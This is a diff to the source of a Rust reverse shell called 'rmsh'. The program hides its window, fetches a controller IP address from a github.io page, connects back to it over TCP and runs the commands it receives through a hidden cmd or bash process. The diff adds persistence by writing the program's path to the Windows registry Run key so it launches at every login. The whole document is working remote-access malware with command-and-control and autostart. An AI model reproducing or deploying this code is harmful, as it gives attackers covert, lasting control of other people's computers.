@@ -1,5 +1,6 @@
 #![windows_subsystem = "windows"]
 
+extern crate winreg;
 use reqwest::Error;
 use std::{
     env,
@@ -8,8 +9,10 @@ use std::{
     os::windows::process::CommandExt,
     process::Command,
     thread,
-    time::Duration,
+    time::Duration, path::Path,
 };
+use winreg::enums::*;
+use winreg::RegKey;
 
 #[cfg(target_os = "windows")]
 const SHELL: [&str; 2] = ["cmd", "/c"];
@@ -18,15 +21,24 @@ const SHELL: [&str; 2] = ["bash", "-c"];
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-#[tokio::main]
-async fn fetch_url() -> Result<String, Error> {
+fn fetch_url() -> Result<String, Error> {
     let request_url = format!("https://khaiyuanyap.github.io/rmsh/metadata/ip.txt");
-    let response = reqwest::get(&request_url).await?;
-    let body = response.text().await?;
+    let response = reqwest::blocking::get(&request_url)?;
+    let body = response.text()?;
     Ok(body)
 }
 
 fn main() {
+    // Use winreg to make this app run on startup (Windows only)
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    let path = Path::new("Software").join("Microsoft").join("Windows").join("CurrentVersion").join("Run");
+    let (key, disp) = hkcu.create_subkey(&path).unwrap();
+    dbg!(&disp);
+    let current_path = env::current_exe().unwrap().to_str().unwrap().to_string();
+    // Get the path from the 5th character onwards
+    let current_path = current_path[4..].to_string();
+    key.set_value("rmsh", &current_path).unwrap();
+
     let remote_ip = fetch_url().expect("Failed to fetch remote IP");
     loop {
         match TcpStream::connect(remote_ip.to_string()) {
@@ -60,6 +72,7 @@ fn main() {
                                                 "The system cannot find the path specified.",
                                             ),
                                         );
+                                        let _ = stream.write_all(b"\n");
                                         let _ = stream.write_all(b"\n");
                                     } else {
                                         let _ = stream.write_all(
